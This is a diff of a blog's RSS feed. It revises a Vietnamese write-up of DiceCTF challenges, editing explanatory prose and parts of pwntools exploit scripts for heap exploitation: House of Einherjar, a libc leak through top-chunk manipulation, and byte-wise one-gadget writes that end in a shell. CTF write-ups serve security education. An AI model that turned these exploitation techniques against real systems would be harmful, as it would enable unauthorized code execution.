@@ -16,7 +16,7 @@
       
       <guid>https://w1n-gl0ry.github.io/posts/dice_ctf_2024/</guid>
       <description><![CDATA[<h1 id="lời-nói-đầu">Lời nói đầu</h1>
-<p>Trải qua 1 năm khá dài dẳng với CTF, mình quyết định kết thúc năm 2023 này với giải DiceCTF. Sau đây là writeups của 1 số bài mình làm được trong suốt giải.</p>
+<p>Tuần cuối cùng của năm 2023, mình quyết định kết thúc năm 2023 này với giải DiceCTF. Sau đây là writeups của 1 số bài mình làm được trong suốt giải.</p>
 <h1 id="pwn---babytalk">Pwn - babytalk</h1>
 <h2 id="source-code-overview">Source code overview</h2>
 <ul>
@@ -58,7 +58,7 @@
 Do đó, ta có thể lấp đầy heap.</p>
 <p><img src="https://hackmd.io/_uploads/rJcByhPo6.png" alt="image"></p>
 <p>Bây giờ ta gọi hàm <code>do_tok()</code> và chỉ định delimiter byte là byte đầu tiên của trường size của chunk kế tiếp, ta sẽ trigger được null byte overflow.</p>
-<p><img src="https://hackmd.io/_uploads/B1xv12wj6.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r12VeNuoT.png" alt="image"></p>
 <p>Đến đây, mình khá là tà đạo nên sẽ sử dụng kĩ thuật House of einherjar để ghi đè <code>__free_hook</code> và get shell.</p>
 <h2 id="solve-script">Solve Script</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -185,7 +185,7 @@ Do đó, ta có thể lấp đầy heap.</p>
 <p><a href="https://wiki.osdev.org/C%2B%2B#GCC">__dso_handle</a> ?</p>
 <p>Nó được đưa vào tham số thứ 3 của hàm <code>__cxa_atexit</code> và được dùng để xác định dynamic shared objects trong quá trình hủy đối tượng toàn cục (thông thường là ở quá trình kết thúc chương trình)</p>
 <p><code>int __cxa_atexit(void (*destructor) (void *), void *arg, void *__dso_handle);</code></p>
-<p>Thay đổi giá trị của biến này không có ý nghĩa gì trong việc khai thác.</p>
+<p>Nhìn vào đoạn code dưới đây, khi mà ta thay đổi giá trị của <code>__dso_handle</code> thì không có ý nghĩa trong việc khai thác lắm</p>
 <p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/cxa_finalize.c">stdlib/cxa_finalize.c</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
@@ -313,12 +313,12 @@ Do đó, ta có thể lấp đầy heap.</p>
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">randomize_page</span>(mm<span style="color:#f92672">-&gt;</span>brk, <span style="color:#ae81ff">0x02000000</span>);
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Nhìn vào source trên, địa chỉ của Heap sẽ bắt đầu từ 0 -&gt; 0x02000000 (dài khoảng 8192 pages) sau địa chỉ của program (bằng 0 nếu binary không có cơ chế ASLR), mà địa chỉ Heap trải dài khoảng 33 pages (dài 0x21000). Do đó ta có thể brute tương đương 1/249 lần (33/8192) để có thể xác định được 1 địa chỉ hợp lệ ở phân vùng Heap, từ đó ta có thể xác định được địa chỉ Heap base bằng cách kiểm tra byte cuối của <code>top chunk</code> size hoặc <code>tcache_perthread_struct</code> size field.</p>
+</span></span></code></pre></div><p>Nhìn vào source trên, địa chỉ của Heap sẽ bắt đầu từ 0 -&gt; 0x02000000 (dài khoảng 8192 pages) tính từ địa chỉ kết thúc của program (bằng 0 nếu binary không có cơ chế ASLR), mà địa chỉ Heap trải dài khoảng 33 pages (dài 0x21000). Do đó ta có thể brute tương đương 1/249 lần (33/8192) để có thể xác định được 1 địa chỉ hợp lệ ở phân vùng Heap, từ đó ta có thể xác định được địa chỉ Heap base bằng cách kiểm tra byte cuối của <code>top chunk</code> hoặc <code>tcache_perthread_struct</code> size field.</p>
 <h3 id="leak-libc">Leak LIBC</h3>
-<p>Leak libc từ 1 chunk được đưa vào unsorted bin là điều mà ta thường hay làm, nhưng ở bài này thì không đơn giản như vậy. Ta có thể allocate 1 chunk lớn thông qua hàm <code>scanf</code> nhưng sau đó sẽ bị free và consolidate với top-chunk nên ta sẽ không thể leak được.</p>
+<p>Leak libc từ 1 chunk được đưa vào unsorted bin nhờ AAR là điều mà ta thường hay làm, nhưng ở bài này thì không đơn giản như vậy. Ta có thể allocate 1 chunk lớn thông qua hàm <code>scanf</code> nhưng sau khi kết thúc hàm scanf nó sẽ free và consolidate với top-chunk nên ta sẽ không thể leak được.</p>
 <p>Ta có thể ghi đè size của top-chunk:</p>
 <ul>
-<li>Khi mà size của top-chunk không đủ lớn để phân bổ, nó sẽ gọi đến <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547">sysmalloc</a> để phân bổ vùng nhớ mới và sẽ gọi đến <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4420">_int_free</a> để free top-chunk cũ nếu thõa mãn các điều kiện dưới đây</li>
+<li>Khi mà size của top-chunk không đủ lớn để phân bổ, nó sẽ gọi đến <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547">sysmalloc</a> để phân bổ vùng heap mới và sẽ gọi đến <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4420">_int_free</a> để free top-chunk cũ nếu thõa mãn các điều kiện dưới đây</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> ((old_top <span style="color:#f92672">==</span> <span style="color:#a6e22e">initial_top</span> (av) <span style="color:#f92672">&amp;&amp;</span> old_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span>
 </span></span><span style="display:flex;"><span>  ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (old_size) <span style="color:#f92672">&gt;=</span> MINSIZE <span style="color:#f92672">&amp;&amp;</span>
@@ -366,7 +366,7 @@ Do đó, ta có thể lấp đầy heap.</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
 </span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
-</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4m&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4m&#34;</span>)
 </span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;L&#34;</span>)
 </span></span><span style="display:flex;"><span>    ptr <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
@@ -409,7 +409,7 @@ Do đó, ta có thể lấp đầy heap.</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>tcache_perthread_struct <span style="color:#f92672">=</span> heap_page <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
 </span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>tcache_perthread_struct<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
@@ -458,12 +458,12 @@ Do đó, ta có thể lấp đầy heap.</p>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ((addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>nth) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)<span style="color:#f92672">.</span>encode()
 </span></span><span style="display:flex;"><span>og <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> og_offset[<span style="color:#ae81ff">2</span>]
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">0</span>)), ret)
-</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">1</span>)), ret<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">2</span>)), ret<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">0</span>)), ret, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">1</span>)), ret<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">2</span>)), ret<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div><p>Ở bài này, vì có write primitive ở khá là mạnh nên mọi người có thể làm nhiều cách khác nhau (có thể là trên dl và mình sẽ nghiên cứu trong tương lai :v).</p>
+</span></span></code></pre></div><p>Ở bài này, vì có write primitive ở libc 2.35 khá là mạnh nên mọi người có thể làm nhiều cách khác nhau, mọi người có thể tham khảo ở <a href="https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc">bài viết này</a></p>
 <h1 id="mics---zshfuck">Mics - zshfuck</h1>
 <h2 id="source-code-overview-2">Source code overview</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/zsh
@@ -2919,7 +2919,7 @@ Vector Exploit:
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enter</span>(idx, x, y):
 </span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
 </span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index: &#39;</span>, idx)
-</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter x: &#39;</span>, x)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#960050;background-color:#1e0010">E</span><span style="color:#e6db74">nter x: &#39;</span>, x)
 </span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter y: &#39;</span>, y)
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sumVector</span>(idx):
